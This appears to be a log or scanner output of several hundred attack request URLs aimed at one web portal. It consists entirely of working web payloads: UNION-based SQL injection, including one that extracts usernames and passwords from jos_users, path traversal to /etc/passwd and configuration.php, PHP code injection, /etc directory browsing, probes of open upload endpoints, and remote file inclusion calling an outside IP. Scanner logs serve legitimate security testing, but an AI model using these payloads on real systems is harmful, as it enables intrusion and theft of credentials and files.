+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443//stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443//index.php?option=com_rsfiles&view=files&layout=agreement&tmpl=component&cid=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--
+URL       : https://dc4-web-portal.cityinthe.cloud:443//index.php/component/civicrm/?task=civicrm/ajax/jqState&_value=-1 UNION SELECT 1,concat(0x673716C2D696E6A656374696F6E2D74657374)
+URL       : https://dc4-web-portal.cityinthe.cloud:443/piwigo/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443//install.php?dl=/../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>
+URL       : https://dc4-web-portal.cityinthe.cloud:443/oss7/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/oss7/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/oss6/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/oss6/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/oss5/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/oss5/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/lib/browsefolders.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/lib/browsefiles.php?dir=/etc
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?option=com_rsgallery2&page=inline&id=421&catid=-12+union+select+1
+URL       : https://dc4-web-portal.cityinthe.cloud/kuvia-toimitiloistainterface/ipsconnect/ipsconnect.php
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?option=com_rsgallery2&page=inline&id=421&catid=-12+union+select+1
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?option=com_rsgallery2&page=inline&id=421&catid=-12+union+select+1
+URL       : https://dc4-web-portal.cityinthe.cloud/kuvia-toimitiloistainterface/ipsconnect/ipsconnect.php
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?Itemid=1&option=com_ignitegallery&task=view&gallery=-1+union+select+1,2,concat(0x3c757365723e,username,0x3c757365723e3c706173733e,password,0x3c706173733e)KHG,4,5,6,7,8,9,10+from+jos_users--
+URL       : https://www.dc4-web-portal.cityinthe.cloud/uploadify/uploadify.php?folder=/
+URL       : https://www.dc4-web-portal.cityinthe.cloud/uploadify/uploadify.php?folder=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Pressi&id=2318&Itemid=100676&jsmallfib=1&option=com_content&sort_as=asc&sort_by=name&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Ohjeita2&id=1599&Itemid=100838&jsmallfib=1&option=com_content&sort_as=desc&sort_by=/etc/passwd&view=article
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Teljan_srkn/2016&id=476&Itemid=100654&jsmallfib=1&option=com_content&sort_as=desc&sort_by=name&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Ohjeita2&id=1599&Itemid=100838&jsmallfib=1&option=com_content&sort_as=desc&sort_by=/
+URL       : https://dc4-web-portal.cityinthe.cloud/?/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Laviasrkn/2016&id=2544&Itemid=100987&jsmallfib=1&option=com_content&sort_as=asc&sort_by=/etc/passwd&view=article
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/K-Psrkn/2016&id=2301&Itemid=100659&jsmallfib=1&option=com_content&sort_as=asc&sort_by=/etc/passwd&view=article
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/PhlavaLahetys&id=2525&Itemid=100897&jsmallfib=1&option=com_content&sort_as=desc&sort_by=name&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/K-Psrkn/2016&id=2301&Itemid=100659&jsmallfib=1&option=com_content&sort_as=desc&sort_by=/etc/passwd&view=article
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Ohjeita2&id=1599&Itemid=100838&jsmallfib=1&option=com_content&sort_as=desc&sort_by=name&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/PhlavaLahetys&id=2525&Itemid=100897&jsmallfib=1&option=com_content&sort_as=asc&sort_by=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Laviasrkn/2015&id=2675&Itemid=100891&jsmallfib=1&option=com_content&sort_as=desc&sort_by=size&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Teljan_srkn/2016&id=476&Itemid=100654&jsmallfib=1&option=com_content&sort_as=asc&sort_by=/etc/passwd&view=article
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Ohjeita2&id=1599&Itemid=100838&jsmallfib=1&option=com_content&sort_as=asc&sort_by=name&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Laviasrkn/2016&id=2544&Itemid=100987&jsmallfib=1&option=com_content&sort_as=desc&sort_by=/etc/passwd&view=article
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/L-Psrkn/2016&id=2372&Itemid=100786&jsmallfib=1&option=com_content&sort_as=desc&sort_by=/etc/passwd&view=article
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/L-Psrkn/2016&id=2372&Itemid=100786&jsmallfib=1&option=com_content&sort_as=desc&sort_by=name&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/PhlavaLahetys&id=2525&Itemid=100897&jsmallfib=1&option=com_content&sort_as=desc&sort_by=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Ohjeita2&id=1599&Itemid=100838&jsmallfib=1&option=com_content&sort_as=desc&sort_by=size&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Laviasrkn/2015&id=2675&Itemid=100891&jsmallfib=1&option=com_content&sort_as=asc&sort_by=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Laviasrkn/2016&id=2544&Itemid=100987&jsmallfib=1&option=com_content&sort_as=asc&sort_by=size&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/Teljan_srkn/2016&id=476&Itemid=100654&jsmallfib=1&option=com_content&sort_as=asc&sort_by=/
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/NmrkkuSrkn/2016&id=2557&Itemid=100988&jsmallfib=1&option=com_content&sort_as=asc&sort_by=name&view=/
+URL       : https://dc4-web-portal.cityinthe.cloud/uploadify/uploadify.php?folder=/
+URL       : https://dc4-web-portal.cityinthe.cloud/tiny_mce/plugins/tinybrowser/upload_file.php?folder=/&type=file&feid=&obfuscate=&sessidpass=
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?dir=JSROOT/MP-srkn/2016&id=2672&Itemid=100986&jsmallfib=1&option=com_content&sort_as=asc&sort_by=name&view=/
+URL       : https://www.dc4-web-portal.cityinthe.cloud/uploadify/uploadify.php?folder=/
+URL       : https://www.dc4-web-portal.cityinthe.cloud/tiny_mce/plugins/tinybrowser/upload_file.php?folder=/&type=file&feid=&obfuscate=&sessidpass=
+URL       : https://dc4-web-portal.cityinthe.cloud/tiny_mce/plugins/tinybrowser/upload_file.php?folder=/&type=file&feid=&obfuscate=&sessidpass=
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?Itemid=1&option=com_ignitegallery&task=view&gallery=-1+union+select+1
+URL       : https://dc4-web-portal.cityinthe.cloud/?/
+URL       : https://dc4-web-portal.cityinthe.cloud/uploadify/uploadify.php?folder=/
+URL       : https://dc4-web-portal.cityinthe.cloud/?page=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/?file=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/?cat=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/?mod=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/?url=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/?abspath=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/?root=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/?documentroot=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?wp_abspath=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?url=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?url=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?abspath=http://116.125.126.111/page.php
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?option=com_simplephotogallery&view=images&photoid=&Itemid=&albumid=-0 UNION ALL SELECT NULL,NULL,CONCAT(0x776F6F79756E),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+URL       : https://dc4-web-portal.cityinthe.cloud/index.php?option=com_hdflvplayer&id=-0 UNION ALL SELECT CONCAT(0x776F6F79756E),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+URL       : https://dc4-web-portal.cityinthe.cloud/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php
